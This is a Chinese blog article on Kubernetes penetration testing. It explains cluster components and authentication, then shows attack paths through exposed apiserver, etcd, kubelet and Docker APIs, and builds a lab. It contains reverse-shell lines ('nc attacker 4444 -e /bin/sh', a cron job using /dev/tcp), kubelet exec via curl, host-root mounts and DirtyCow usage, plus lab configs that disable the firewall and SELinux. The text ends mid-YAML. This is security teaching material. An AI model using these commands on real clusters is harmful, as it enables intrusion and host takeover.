\> 本文由 \[简悦 SimpRead\](http://ksria.com/simpread/) 转码， 原文地址 \[blog.riskivy.com\](https://blog.riskivy.com/kubernetes-%e9%9b%86%e7%be%a4%e6%b8%97%e9%80%8f%e6%b5%8b%e8%af%95/)

前言
--

Kubernetes 是一个开源的，用于编排云平台中多个主机上的容器化的应用，目标是让部署容器化的应用能简单并且高效的使用, 提供了应用部署，规划，更新，维护的一种机制。其核心的特点就是能够自主的管理容器来保证云平台中的容器按照用户的期望状态运行着，管理员可以加载一个微型服务，让规划器来找到合适的位置，同时，Kubernetes 在系统提升工具以及人性化方面，让用户能够方便的部署自己的应用。有着以上优点，让 kubernetes 越来越流行。同时，安全问题逐渐明显起来。

**一、核心组件与资源对象**
---------------

常见的 Kubernetes 集群结构图如下，Master 节点是集群的控制节点，Node 节点则是集群的工作节点。

![](https://blog.riskivy.com/wp-content/uploads/2019/02/3.png)

### 1\. Master 节点

Master 节点是 Kubernetes 集群的控制节点，每个 Kubernetes 集群里至少有一个 Master 节点，它负责整个集群的决策（如调度），发现和响应集群的事件。Master 节点可以运行在集群中的任意一个节点上，但是最好将 Master 节点作为一个独立节点，不在该节点上创建容器，因为如果该节点出现问题导致宕机或不可用，整个集群的管理就会失效。

在 Master 节点上，通常会运行以下服务：

*   kube-apiserver: 部署在 Master 上暴露 Kubernetes API，是 Kubernetes 的控制面。
*   etcd: 一致且高度可用的 Key-Value 存储，用作 Kubernetes 的所有群集数据的后备存储。
*   kube-scheduler: 调度器，运行在 Master 上，用于监控节点中的容器运行情况，并挑选节点来创建新的容器。调度决策所考虑的因素包括资源需求，硬件 / 软件 / 策略约束，亲和和排斥性规范，数据位置，工作负载间干扰和最后期限。
*   kube-controller-manager  
    

  
控制和管理器，运行在 Master 上，每个控制器都是独立的进程，但为了降低复杂性，这些控制器都被编译成单一的二进制文件，并以单独的进程运行。

### 2\. Node 节点

Node 节点是 Kubernetes 集群的工作节点，每个集群中至少需要一台 Node 节点，它负责真正的运行 Pod，当某个 Node 节点出现问题而导致宕机时，Master 会自动将该节点上的 Pod 调度到其他节点。Node 节点可以运行在物理机上，也可以运行在虚拟机中。

在 Node 节点上，通常会运行以下服务：

*   kubelet: 运行在每一个 Node 节点上的客户端，负责 Pod 对应的容器创建，启动和停止等任务，同时和 Master 节点进行通信，实现集群管理的基本功能。
*   kube-proxy: 负责 Kubernetes Services 的通信和负载均衡机制。
*   Docker Engine: 负责节点上的容器的创建和管理。

Node 节点可以在集群运行期间动态增加，只要整个节点已经正确安装配置和启动了上面的进程。在默认情况下，kubelet 会向 Master 自动注册。一旦 Node 被接入到集群管理中，kubelet 会定时向 Master 节点汇报自身的情况（操作系统，Docker 版本，CPU 内存使用情况等），这样 Master 便可以在知道每个节点的详细情况的同时，还能知道该节点是否是正常运行。当 Node 节点心跳超时时，Master 节点会自动判断该节点处于不可用状态，并会对该 Node 节点上的 Pod 进行迁移。

### 3\. 资源对象

#### pod

Pod 是 Kubernetes 最重要也是最基本的概念，一个 Pod 是一组共享网络和存储（可以是一个或多个）的容器。Pod 中的容器都是统一进行调度，并且运行在共享上下文中。一个 Pod 被定义为一个逻辑的 host，它包括一个或多个相对耦合的容器。

Pod 的共享上下文，实际上是一组由 namespace、cgroups, 其他资源的隔离的集合，意味着 Pod 中的资源已经是被隔离过了的，而在 Pod 中的每一个独立的 container 又对 Pod 中的资源进行了二次隔离。

![](https://blog.riskivy.com/wp-content/uploads/2019/02/2.png)

#### Service

Kubernetes Service 定义了这样一种抽象：一个 Pod 的逻辑分组，一种可以访问它们的策略，通常称为微服务。 这一组 Pod 能够被 Service 访问到，通常是通过 Label Selector 实现的。

举个例子，考虑一个图片处理 backend，它运行了 3 个副本，这些副本是可互换的，frontend 不需要关心它们调用了哪个 backend 副本。 然而组成这一组 backend 程序的 Pod 实际上可能会发生变化，frontend 客户端不应该也没必要知道，而且也不需要跟踪这一组 backend 的状态。 Service 定义的抽象能够解耦这种关联。

对 Kubernetes 集群中的应用，Kubernetes 提供了简单的 Endpoints API，只要 Service 中的一组 Pod 发生变更，应用程序就会被更新。 对非 Kubernetes 集群中的应用，Kubernetes 提供了基于 VIP 的网桥的方式访问 Service，再由 Service 重定向到 backend Pod。

#### Namespace

Namespace 是对一组资源和对象的抽象集合，比如可以用来将系统内部的对象划分为不同的项目组或用户组。常见的 pods, services, replication controllers 和 deployments 等都是属于某一个 namespace 的（默认是 default），而 node, persistentVolumes 等则不属于任何 namespace。

Namespace 常用来隔离不同的用户，比如 Kubernetes 自带的服务一般运行在 kube-system namespace 中。

#### Deployment

Deployment 是 ReplicationController 的升级版本，Deployment 控制器会根据在 Deployment 对象中描述的期望状态对 Pod 进行调整。通过 Deployment 控制器，我们可以随时了解 Pod 部署的进度，因为实际上 Pod 的创建、调度、绑定等操作都是需要时间的。

Deployment 典型应用场景：

*   创建 Deployment 对象来生产对应的 ReplicaSet 来完成部署
*   通过更新 Deployment 的 PodTemplateSpec 更新 Pod 的最新状态。更新时，新的 RelicaSet 会被创建，Deployment 控制器会将老的 ReplicaSet 中的 Pod 以一定的速率迁移到新的 ReplicaSet 中。
*   回滚到早期版本
*   扩展 Deployment 以应对高负载
*   暂停 Deployment 以便一次性修改多个 PodTemplateSpec 的配置项，之后再恢复 Deployment 进行新的发布
*   查看 Deployment 状态来作为发布是否成功的标准
*   清理不需要的 ReplicaSet

### 4\. 运行流程

创建 pod 的基本流程如下：

![](https://blog.riskivy.com/wp-content/uploads/2019/02/15.png)

1.  用户提交创建 Pod 的请求，可以通过 API Server 的 REST API ，也可用 Kubectl 命令行工具，支持 Json 和 Yaml 两种格式；
2.  API Server 处理用户请求，存储 Pod 数据到 etcd；
3.  Schedule 通过和 API Server 的 watch 机制，查看到新的 Pod，尝试为 Pod 绑定 Node；
4.  过滤主机：调度器用一组规则过滤掉不符合要求的主机，比如 Pod 指定了所需要的资源，那么就要过滤掉资源不够的主机；
5.  主机打分：对第一步筛选出的符合要求的主机进行打分，在主机打分阶段，调度器会考虑一些整体优化策略，比如把一个 Replication Controller 的副本分布到不同的主机上，使用最低负载的主机等；
6.  选择主机：选择打分最高的主机，进行 binding 操作，结果存储到 etcd 中；
7.  Kubelet 根据调度结果执行 Pod 创建操作：绑定成功后，会启动 container，docker run，scheduler 会调用 API Server 的 API 在 etcd 中创建一个 bound pod 对象，描述在一个工作节点上绑定运行的所有 pod 信息。运行在每个工作节点上的 Kubelet 也会定期与 etcd 同步 bound pod 信息，一旦发现应该在该工作节点上运行的 bound pod 对象没有更新，则调用 Docker API 创建并启动 pod 内的容器。

**二、认证授权机制**
------------

### 1\. Service Account 认证

针对在 pod 内部访问 apiserver，获取集群的信息和改动，kubernetes 提供了特殊的认证方式：Service Account。Service Account 是面向 namespace 的，namespace 创建的时候，kubernetes 会自动在这个 namespace 下面创建一个默认的 Service Account；并且这个 Service Account 只能访问该 namespace 的资源。Service Account 和 pod、service、deployment 一样是 kubernetes 集群中的一种资源，用户也可以创建自己的 service account。

ServiceAccount 主要包含了三个内容：namespace、Token 和 CA。namespace 指定了 pod 所在的 namespace，CA 用于验证 apiserver 的证书，token 用作身份验证。它们都通过 mount 的方式保存在 pod 的文件系统中，其中 token 保存的路径是 /var/run/secrets/kubernetes.io/serviceaccount/token ，是 apiserver 通过私钥签发 token 的 base64 编码后的结果；CA 保存的路径是 /var/run/secrets/kubernetes.io/serviceaccount/ca.crt ，namespace 保存的路径是 /var/run/secrets/kubernetes.io/serviceaccount/namespace ，也是用 base64 编码。

如果 token 能够通过认证，那么请求的用户名将被设置为 system:serviceaccount:(NAMESPACE):(SERVICEACCOUNT) ，而请求的组名有两个： system:serviceaccounts 和 system:serviceaccounts:(NAMESPACE)。

### 2\. RBAC 授权

在 Kubernetes 中，授权有 ABAC（基于属性的访问控制）、RBAC（基于角色的访问控制）、Webhook、Node、AlwaysDeny（一直拒绝）和 AlwaysAllow（一直允许）这 6 种模式。从 1.6 版本起，Kubernetes 默认启用 RBAC 访问控制策略。从 1.8 开始，RBAC 已作为稳定的功能。通过设置–authorization-mode=RBAC。RBAC API 中，通过如下的步骤进行授权：

1）定义角色：在定义角色时会指定此角色对于资源的访问控制的规则；

2）绑定角色：将主体与角色进行绑定，对用户进行访问授权。

在 RBAC API 中，角色包含代表权限集合的规则。在这里，权限只有被授予，而没有被拒绝的设置。在 Kubernetes 中有两类角色，即普通角色和集群角色。可以通过 Role 定义在一个命名空间中的角色，或者可以使用 ClusterRole 定义集群范围的角色。一个角色只能被用来授予访问单一命令空间中的资源。

![](https://blog.riskivy.com/wp-content/uploads/2019/02/19.png)

### 3\. Keystone Password 认证

Keystone 是 openstack 提供的认证和授权组件，这个方法对于已经使用 openstack 来搭建 Iaas 平台的公司比较适用，直接使用 keystone 可以保证 Iaas 和 Caas 平台保持一致的用户体系。

需要 API Server 在启动时指定–experimental-keystone-url=，而 https 时还需要设置–experimental-keystone-ca-file=SOMEFILE。

**三、安全风险**
----------

### 1\. kube-apiserver

部署在 Master 上暴露 Kubernetes API，是 Kubernetes 的控制面。Kubernetes API 服务器为 API 对象验证和配置数据，这些对象包含 Pod，Service，ReplicationController 等等。API Server 提供 REST 操作以及前端到集群的共享状态，所有其它组件可以通过这些共享状态交互。

默认情况，Kubernetes API Server 提供 HTTP 的两个端口：

1）本地主机端口

*   HTTP 服务
*   默认端口 8080，修改标识–insecure-port
*   默认 IP 是本地主机，修改标识—insecure-bind-address
*   在 HTTP 中没有认证和授权检查
*   主机访问受保护

2）Secure Port

*   默认端口 6443，修改标识—secure-port
*   默认 IP 是首个非本地主机的网络接口，修改标识—bind-address
*   HTTPS 服务。设置证书和秘钥的标识，–tls-cert-file，–tls-private-key-file
*   认证方式，令牌文件或者客户端证书
*   使用基于策略的授权方式

访问 Rest API, 会返回可用的 API 列表，如下所示：

![](https://blog.riskivy.com/wp-content/uploads/2019/02/4.png)

如果 Kubernetes API Server 配置了 Dashboard, 通过路径 / ui 即可访问

![](https://blog.riskivy.com/wp-content/uploads/2019/02/5.png)

该操作界面可以创建、修改、删除容器，查看日志等。我们可以编写 yaml 文件，构造 pod 来获取命令执行。如下提供了三种部署 pod 的方式

![](https://blog.riskivy.com/wp-content/uploads/2019/02/6.png)

输入文本创建一个 pod，将节点的根目录挂载到容器的 / mnt 目录。获取到宿主机权限

![](https://blog.riskivy.com/wp-content/uploads/2019/02/7.png)

创建 pod 过程中，同样可命令执行反弹 shell

```
apiVersion: v1
kind: Pod
metadata:
  name: test
spec:
  containers:
  - name: busybox
    image: busybox:1.29.2
    command: \["/bin/sh"\]
    args: \["-c", "nc attacker 4444 -e /bin/sh"\]
    volumeMounts:
    - name: host
      mountPath: /host
  volumes:
  - name: host
    hostPath:
      path: /
      type: Directory


```

进入容器组，打开命令执行窗口

![](https://blog.riskivy.com/wp-content/uploads/2019/02/8.png)

![](https://blog.riskivy.com/wp-content/uploads/2019/02/9.png)

Kubernetes 官方提供了一个命令行工具 kubectl。使用 kubectl 同样可以获取容器的 shell，完成命令执行。并且可进入指定的容器执行命令

![](https://blog.riskivy.com/wp-content/uploads/2019/02/11.png)

如果在 kubelet 进程启动时加–enable-debugging-handles=true 参数，那么 kubernetes Proxy API 还会增加以下接口：  
/api/v1/proxy/nodes/{name}/run #在节点上运行某个容器

/api/v1/proxy/nodes/{name}/exec #在节点上的某个容器中运行某条命令

/api/v1/proxy/nodes/{name}/attach #在节点上 attach 某个容器

/api/v1/proxy/nodes/{name}/portForward #实现节点上的 Pod 端口转发

/api/v1/proxy/nodes/{name}/logs #列出节点的各类日志信息

/api/v1/proxy/nodes/{name}/metrics #列出和该节点相关的 Metrics 信息

/api/v1/proxy/nodes/{name}/runningpods #列出节点内运行中的 Pod 信息

/api/v1/proxy/nodes/{name}/debug/pprof #列出节点内当前 web 服务的状态，包括 CPU 和内存的使用情况

除此之外，通过访问 pod, 访问到某个服务接口：  
/api/v1/proxy/namespaces/{namespace}/pods/{name}/{path:\*}

### 2\. etcd

通常 etcd 数据库会被安装到 master 节点上，rest api 可获取集群内 token、证书、账户密码等敏感信息，默认端口为 2379。访问路径 / v2/keys/?recursive=true，以 JSON 格式返回存储在服务器上的所有密钥。部分结果如下：

![](https://blog.riskivy.com/wp-content/uploads/2019/02/12.png)

安装 etcdctl，可以使用类似的方式查询 API

```
etcdctl --endpoint=http://\[etcd\_server\_ip\]:2379 ls


```

![](https://blog.riskivy.com/wp-content/uploads/2019/02/16.png)

若存在路径 / registry/secrets/default，其中可能包含对集群提升权限的默认服务令牌。

### 3\. Kubelet

kubernetes 是一个分布式的集群管理系统，在每个节点（node）上都要运行一个 worker 对容器进行生命周期的管理，这个 worker 程序就是 kubelet。

kubelet 的主要功能就是定时从某个地方获取节点上 pod/container 的期望状态（运行什么容器、运行的副本数量、网络或者存储如何配置等等），并调用对应的容器平台接口达到这个状态。

集群状态下，kubelet 会从 master 上读取信息，但其实 kubelet 还可以从其他地方获取节点的 pod 信息。目前 kubelet 支持三种数据源：

1.  本地文件
2.  通过 url 从网络上某个地址来获取信息
3.  API Server：从 kubernetes master 节点获取信息

10250 端口是 kubelet API 的 HTTPS 端口，通过路径 / pods 获取环境变量、运行的容器信息、命名空间等信息。如下所示：

![](https://blog.riskivy.com/wp-content/uploads/2019/02/13.png)

获取到 namespace、pod、container 的信息后，执行如下请求。实现命令执行

```
curl --insecure -v -H "X-Stream-Protocol-Version: v2.channel.k8s.io" -H "X-Stream-Protocol-Version: channel.k8s.io" -X POST "https://kube-node-here:10250/exec/<namespace>/<podname>/<container-name>?command=touch&command=hello\_world&input=1&output=1&tty=1"


```

本地搭建测试环境进行复现，从返回结果中得到 websocket 地址

![](https://blog.riskivy.com/wp-content/uploads/2019/02/22.png)

采用 wscat 进行 websocket 连接。wscat 是一个用来连接 websocket 的命令行工具，由 nodejs 开发，通过 npm 进行安装 `npm install -g wscat`

![](https://blog.riskivy.com/wp-content/uploads/2019/02/23.png)

### 4\. Docker Engine

#### 未授权访问 Rest API

kubernetes 的容器编排技术进行管理构成的 docker 集群，kubernetes 是 google 开源的容器管理系统，实现基于 Docker 构建容器，利用 kubernetes 可以很方便的管理含有多台 Docker 主机中的容器，将多个 docker 主机抽象为一个资源，以集群方式管理容器。

当 docker 配置了 Rest api, 我们可以通过路径 / containers/json 获取服务器主机当前运行的 container 列表。找到存在未授权访问的目标主机，发现已经被安装门罗币矿机。如下图所示：

![](https://blog.riskivy.com/wp-content/uploads/2019/02/14.png)

通过远程访问接口，获得容器访问权限。启动容器时通过挂载根目录到容器内的目录，获取宿主机权限。输入如下指令，获取容器操作权限

```
docker -H tcp://xxx.xxx.xxx.xxx:2375 run -it -v /root/.ssh/:/mnt alpine /bin/sh


```

![](https://blog.riskivy.com/wp-content/uploads/2019/02/18.png)

为实现对宿主机的控制，使用方法如下：

1.  ssh 公钥到跟文件，进而无密码 ssh 访问宿主机命令行
2.  任务计划反弹 shell，`echo -e "\n\n*/1 * * * * /bin/bash -i >& /dev/tcp/IP/PORT 0>&1\n\n" >> /mnt/root`

#### 风险漏洞

容器和宿主机是共用内核的，所以如果宿主机的 Linux 内核没升级的话，利用 DirtyCow(CVE-2016-5195) 漏洞可获取宿主机 root 权限。

漏洞影响范围：2.x~4.83

利用方法：

下载提权 root 的 exploit `https://github.com/FireFart/dirtycow`

使用 gcc -pthread dirty.c -o dirty -lcrypt 命令对 dirty.c 进行编译，生成一个 dirty 的可执行文件

执行./dirty 密码命令，即可进行提权。获取 username 和 password，输入 su username 获取 root 权限

![](https://blog.riskivy.com/wp-content/uploads/2019/02/21.png)

### 5\. 认证与授权

#### Service Account

Service Account 概念的引入是基于这样的使用场景：运行在 Pod 里的进程需要调用 Kubernetes API 以及非 Kubernetes API 的其它服务（如 image repository / 被 mount 到 Pod 上的 NFS volumes 中的 file 等）。

Kubernetes 默认会挂载 /run/secrets/kubernetes.io/serviceaccount/token 到各个 Pod 里，但这样会导致攻击者进入容器后读取 token 就能和 Kubernetes API 通信了。如果 Kubernetes 增加了 RBAC 授权，可能无法使用 token 进行通信。

![](https://blog.riskivy.com/wp-content/uploads/2019/02/24.png)

**四、kubernetes 基本使用**
---------------------

### 1\. 环境搭建

#### 1.1 实验环境

系统版本：centos7x3.10.0-514.el7.x86\_64

Kubernetes 版本：v1.8.3

Kubernetes-node 版本：v1.8.3

Docker 版本：docker-ce.x86\_64 0:18.03.1.ce-1.el7.centos

关闭防火墙并禁止开机自启

systemctl stop firewalld.service  
systemctl disable firewalld

关闭 selinux

sed -i ‘s/SELINUX=enforcing/SELINUX=disabled/g’ /etc/sysconfig/selinux

重启 reboot

#### 1.2 搭建 master 主机 (IP 10.0.85.110)

安装组件：

*   etcd
*   kube-apiserver
*   kube-controller-manager
*   kube-scheduler

##### 1.2.1 安装 kubernetes 服务端

1）下载二进制源码包

```
wget https://storage.googleapis.com/kubernetes-release/release/v1.8.3/kubernetes-server-linux-amd64.tar.gz


```

2）解压源码包

```
tar zxf kubernetes-server-linux-amd64.tar.gz


```

3）递归创建 kubernetes 运行文件存放目录

```
mkdir -p /k8s/{bin,cfg}


```

4）将解压目录里的文件移动到新创建的目录里

```
mv kubernetes/server/bin/{kube-apiserver,kube-controller-manager,kube-scheduler,kubectl} /k8s/bin/


```

##### 1.2.2 安装 etcd 组件

1）安装 etcd

```
yum -y install etcd


```

2）编辑 etcd 的配置文件

vi /etc/etcd/etcd.conf

```
ETCD\_DATA\_DIR="/var/lib/etcd/default.etcd"
ETCD\_LISTEN\_CLIENT\_URLS="http://0.0.0.0:2379"
ETCD\_
ETCD\_ADVERTISE\_CLIENT\_URLS="http://0.0.0.0:2379"


```

3）启动 etcd 服务

设置 etcd 服务开机自启 : systemctl enable etcd

启动 etcd 服务 : systemctl start etcd

##### 1.2.3 配置 kube-apiserver 组件

1）创建 kube-apiserver 配置文件

vi /k8s/cfg/kube-apiserver

```
#启用日志标准错误
KUBE\_LOGTOSTDERR="--logtostderr=true"
#日志级别
KUBE\_LOG\_LEVEL="--v=4"
#Etcd服务地址
KUBE\_ETCD\_SERVERS="--etcd-servers=http://10.0.85.110:2379"
#API服务监听地址
KUBE\_API\_ADDRESS="--insecure-bind-address=0.0.0.0"
#API服务监听端口
KUBE\_API\_PORT="--insecure-port=8080"
#对集群中成员提供API服务地址
KUBE\_ADVERTISE\_ADDR="--advertise-address=10.0.85.110"
#允许容器请求特权模式，默认false
KUBE\_ALLOW\_PRIV="--allow-privileged=false"
#集群分配的IP范围
KUBE\_SERVICE\_ADDRESSES="--service-cluster-ip-range=10.0.0.0/16"


```

2）创建 kube-apiserver 的 systemd 服务启动文件

vi /lib/systemd/system/kube-apiserver.service

```
\[Unit\]
Description=Kubernetes API Server
Documentation=https://github.com/kubernetes/kubernetes
\[Service\]
EnvironmentFile=-/k8s/cfg/kube-apiserver
ExecStart=/k8s/bin/kube-apiserver \\
${KUBE\_LOGTOSTDERR} \\
${KUBE\_LOG\_LEVEL} \\
${KUBE\_ETCD\_SERVERS} \\
${KUBE\_API\_ADDRESS} \\
${KUBE\_API\_PORT} \\
${KUBE\_ADVERTISE\_ADDR} \\
${KUBE\_ALLOW\_PRIV} \\
${KUBE\_SERVICE\_ADDRESSES}
Restart=on-failure
\[Install\]
WantedBy=multi-user.target


```

3）启动 kube-apiserver 服务

```
#重新加载kube-apiserver服务守护进程

systemctl daemon-reload

#设置kube-apiserver服务开机自启

systemctl enable kube-apiserver

#重启kube-apiserver服务

systemctl restart kube-apiserver


```

##### 1.2.4 配置 kube-scheduler 组件

1）创建 kube-scheduler 配置文件

vi /k8s/cfg/kube-scheduler

```
#启用日志标准错误
KUBE\_LOGTOSTDERR="--logtostderr=true"
#日志级别
KUBE\_LOG\_LEVEL="--v=4"
#k8s-master服务地址
KUBE\_MASTER="--master=10.0.85.110:8080"
#指定master为控制台
KUBE\_LEADER\_ELECT="--leader-elect"


```

2）创建 kube-scheduler 的 systemd 服务启动文件

vi /lib/systemd/system/kube-scheduler.service

```
\[Unit\]
Description=Kubernetes Scheduler
Documentation=https://github.com/kubernetes/kubernetes
\[Service\]
EnvironmentFile=/k8s/cfg/kube-scheduler
ExecStart=/k8s/bin/kube-scheduler \\
${KUBE\_LOGTOSTDERR} \\
${KUBE\_LOG\_LEVEL} \\
${KUBE\_MASTER} \\
${KUBE\_LEADER\_ELECT}
Restart=on-failure
\[Install\]
WantedBy=multi-user.target


```

3）启动 kube-scheduler 服务

```
#重新加载kube-scheduler服务守护进程

systemctl daemon-reload

#设置kube-scheduler服务开机自启

systemctl enable kube-scheduler

#重新启动kube-scheduler服务

systemctl restart kube-scheduler


```

##### 1.2.5 配置 kube-controller-manager 组件

1）创建 kube-controller-manager 配置文件

vi /k8s/cfg/kube-controller-manager

```
#启用日志标准错误
KUBE\_LOGTOSTDERR="--logtostderr=true"
#日志级别
KUBE\_LOG\_LEVEL="--v=4"
#k8s-master服务地址
KUBE\_MASTER="--master=10.0.85.113:8080"


```

2）创建 kube-controller-manager 的 systemd 服务启动文件

vi /lib/systemd/system/kube-controller-manager.service

```
\[Unit\]
Description=Kubernetes Controller Manager
Documentation=https://github.com/kubernetes/kubernetes
\[Service\]
EnvironmentFile=/k8s/cfg/kube-controller-manager
ExecStart=/k8s/bin/kube-controller-manager \\
${KUBE\_LOGTOSTDERR} \\
${KUBE\_LOG\_LEVEL} \\
${KUBE\_MASTER} \\
${KUBE\_LEADER\_ELECT}
Restart=on-failure
\[Install\]
WantedBy=multi-user.target


```

3）启动 kube-controller-manager 服务

```
#重新加载kube-controller-manager服务守护进程

systemctl daemon-reload

#设置kube-controller-manager服务开机自启

systemctl enable kube-controller-manager

#重新启动kube-controller-manager服务

systemctl restart kube-controller-manager


```

#### 1.3 搭建 node 主机 (IP 10.0.85.113)

安装组件：

*   kubelet
*   kube-proxy
*   docker

##### 1.3.1 安装 kubernetes 的

1）下载二进制源码包

```
wget https://storage.googleapis.com/kubernetes-release/release/v1.8.3/kubernetes-node-linux-amd64.tar.gz


```

2）解压源码包

```
tar zxf kubernetes-node-linux-amd64.tar.gz


```

3）递归创建 kubernetes 运行文件存放目录

```
mkdir -p /k8s/{bin,cfg}


```

4）将解压目录里的文件移动到新创建的目录里

```
mv kubernetes/node/bin/{ kubectl,kubelet,kube-proxy} /k8s/bin/


```

5）创建连接 master apiserver 配置文件

vi /k8s/cfg/kubelet.kubeconfig

```
apiVersion: v1
kind: Config
clusters:
 - cluster:
    server: http://10.0.85.110:8080
   name: local
contexts:
 - context:
    cluster: local
   name: local
current-context: local


```

6）创建 kubelet 配置文件

vi /k8s/cfg/kubelet

```
#启用日志标准错误
KUBE\_LOGTOSTDERR="--logtostderr=true"
#日志级别
KUBE\_LOG\_LEVEL="--v=4"
#Kubelet服务IP地址
NODE\_ADDRESS="--address=10.0.85.113"
#Kubelet服务端口
NODE\_PORT="--port=10250"
#自定义节点名称
NODE\_HOST
#kubeconfig路径，指定连接API服务器
KUBELET\_KUBECONFIG="--kubeconfig=/k8s/cfg/kubelet.kubeconfig"
#允许容器请求特权模式，默认false
KUBE\_ALLOW\_PRIV="--allow-privileged=false"
#DNS信息
KUBELET\_DNS\_IP="--cluster-dns=10.0.100.2"
KUBELET\_DNS\_DOMAIN="--cluster-domain=cluster.local"
#禁用使用Swap
KUBELET\_SWAP="--fail-swap-on=false"
KUBELET\_ARGS="--pod-infra-container-image=docker.io/kubernetes/pause"


```

7）创建 kubelet 服务的 systemd 启动文件

vi /lib/systemd/system/kubelet.service

```
\[Unit\]
Description=Kubernetes Kubelet
After=docker.service
Requires=docker.service
\[Service\]
EnvironmentFile=-/k8s/cfg/kubelet
ExecStart=/k8s/bin/kubelet \\
${KUBE\_LOGTOSTDERR} \\
${KUBE\_LOG\_LEVEL} \\
${NODE\_ADDRESS} \\
${NODE\_PORT} \\
${NODE\_HOSTNAME} \\
${KUBELET\_KUBECONFIG} \\
${KUBE\_ALLOW\_PRIV} \\
${KUBELET\_DNS\_IP} \\
${KUBELET\_DNS\_DOMAIN} \\
${KUBELET\_SWAP} \\
${KUBELET\_ARGS}
Restart=on-failure
KillMode=process
\[Install\]
WantedBy=multi-user.target


```

8）启动 kubelet 服务

```
#重新加载kubelet服务守护进程

systemctl daemon-reload

#设置kubelet服务开机自启

systemctl enable kubelet

#重新启动kubelet服务

systemctl restart kubelet


```

##### 1.3.2 配置 kube-proxy 组件

1）创建 kube-proxy 配置文件

vi /k8s/cfg/kube-proxy

```
#用日志标准错误
KUBE\_LOGTOSTDERR="--logtostderr=true"
#志级别
KUBE\_LOG\_LEVEL="--v=4"
#定义节点名称
NODE\_HOST
#PI服务地址
KUBE\_MASTER="--master=http://10.0.85.110:8080"


```

2）创建 kube-proxy 服务的 systemd 服务启动文件

vi /lib/systemd/system/kube-proxy.service

```
\[Unit\]
Description=Kubernetes Proxy
After=network.target
\[Service\]
EnvironmentFile=/k8s/cfg/kube-proxy
ExecStart=/k8s/bin/kube-proxy \\
${KUBE\_LOGTOSTDERR} \\
${KUBE\_LOG\_LEVEL} \\
${NODE\_HOSTNAME} \\
${KUBE\_MASTER}
Restart=on-failure
\[Install\]
WantedBy=multi-user.target


```

3）启动 kube-proxy 服务

```
#重新加载kube-proxy服务守护进程

systemctl daemon-reload

#设置kube-proxy服务开机自启

systemctl enable kube-proxy

#重启kube-apiserver服务

systemctl restart kube-proxy


```

##### 1.3.3 安装 docker

1）安装 docker-ce 的 yum 源

下载 yum 源到本地

```
wget http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo


```

移动 yum 源到 / etc/yum.repos.d / 目录下

```
mv docker-ce.repo /etc/yum.repos.d/


```

2）从高到低排列显示 docker 版本

```
yum list docker-ce --showduplicates | sort -r


```

3）安装 docker-ce .x86\_64-18.03.1.ce-1.el7.centos

```
yum -y install docker-ce .x86\_64-18.03.1.ce-1.el7.centos


```

4) 配置 Docker 配置文件，使其允许从 registry 中拉取镜像  
vim /etc/sysconfig/docker

```
\# /etc/sysconfig/docker

# Modify these options if you want to change the way the docker daemon runs
OPTIONS='--selinux-enabled --log-driver=journald --signature-verification=false'
if \[ -z "${DOCKER\_CERT\_PATH}" \]; then
DOCKER\_CERT\_PATH=/etc/docker
fi
OPTIONS='--insecure-registry registry:5000'


```

5）启动 docker 服务

```
//设置docker开机自启

systemctl enable docker

//启动docker服务

systemctl start docker

//重启docker服务

systemctl restart docker


```

#### 1.4 创建覆盖网络——Flannel

1) 安装 Flannel

在 master、node 上均执行如下命令，进行安装

```
yum install flannel


```

2) 配置 Flannel  
master、node 上均编辑 / etc/sysconfig/flanneld，修改 `FLANNEL_ETCD_ENDPOINTS` 部分

vi /etc/sysconfig/flanneld

```
\# Flanneld configuration options

# etcd url location.  Point this to the server where etcd runs
FLANNEL\_ETCD\_ENDPOINTS="http://10.0.85.110:2379"

# etcd config key.  This is the configuration key that flannel queries
# For address range assignment
FLANNEL\_ETCD\_PREFIX="/atomic.io/network"

# Any additional options that you want to pass
#FLANNEL\_OPTIONS=""


```

3) 配置 etcd 中关于 flannel 的 key  
Flannel 使用 Etcd 进行配置，来保证多个 Flannel 实例之间的配置一致性，所以需要在 etcd 上进行如下配置：（‘/atomic.io/network/config’这个 key 与上文 / etc/sysconfig/flannel 中的配置项 FLANNEL\_ETCD\_PREFIX 是相对应的，错误的话启动就会出错）

```
\[root@k8s-master ~\]# etcdctl mk /atomic.io/network/config '{ "Network": "10.0.0.0/16" }'
{ "Network": "10.0.0.0/16" }


```

#### 1.5 启动集群

**1\. 设置 k8s 命令的环境变量**

```
echo "export PATH=$PATH:/k8s/bin" >> /etc/profile


```

注：当前两台机器上都执行！

**2\. 让环境变量立即生效**

```
source /etc/profile


```

**3\. 启动 master**

```
systemctl enable flanneld.service 
systemctl start flanneld.service 
systemctl daemon-reload
systemctl restart kube-apiserver
systemctl restart kube-scheduler
systemctl restart kube-controller-manager


```

**3\. 启动 node**

```
service docker restart
systemctl enable flanneld.service 
systemctl start flanneld.service 
service docker restart
systemctl restart kubelet
systemctl restart kube-proxy


```

### 2\. 错误排查

集群部署的过程中，经常会出现各种问题。基本排查错误的过程如下：

1）执行如下命令，查看是否有组件未启动成功。未启动成功会显示异常错误信息

```
systemctl status flanneld.service
systemctl status kubelet
systemctl status kube-apiserver
systemctl status kube-controller-manager
systemctl status kube-proxy
systemctl status docker


```

![](https://blog.riskivy.com/wp-content/uploads/2019/02/36-1.png)

大部分情况下，报错需要重新启动。或者是由于配置文件的格式错误，具体错误在命令后加 -l

2) systemctl 无法查看到具体错误的情况下，需要查看系统日志文件进行查错

*   执行命令 tail -f /var/log/messages 实时查看日志信息
*   打开文件 vi /var/log/messages，通过 /keyword 来排查组件的报错信息

**五、渗透案例：应用存在 SPEL 表达式注入漏洞**
----------------------------

### 1\. 环境搭建

Spring Data Commons 组件中存在远程代码执行漏洞（CVE-2018-1273），攻击者可构造包含有恶意代码的 SPEL 表达式实现远程代码攻击，直接获取服务器控制权限。

Spring Data 是一个用于简化数据库访问，并支持云服务的开源框架, 包含 Commons、Gemfire、JPA、JDBC、MongoDB 等模块。此漏洞产生于 Spring Data Commons 组件，该组件为提供共享的基础框架，适合各个子项目使用，支持跨数据库持久化。请受此漏洞影响用户尽快升级组件。

漏洞影响：

*   2.0.0-2.0.5
*   1.13.0-1.13.10

创建 deployment，编写文件 RCE-vul.yaml 如下所示：

```
apiVersion: extensions/v1beta1  
kind: Deployment
metadata:
  name: rce-deployment
  labels:
    name: rce-deployment
spec:
  replicas: 1  
  template:
   metadata:
     labels:   
      app: vul-rce
   spec:
     containers:
      - name: rce-container  
      image: knqyf263/cve-2018-1273
      imagePullPolicy: Always


```

为了实现 node 节点主机访问该应用，创建 service, 编写 vul-sr.yaml 如下所示：

```
apiVersion: v1
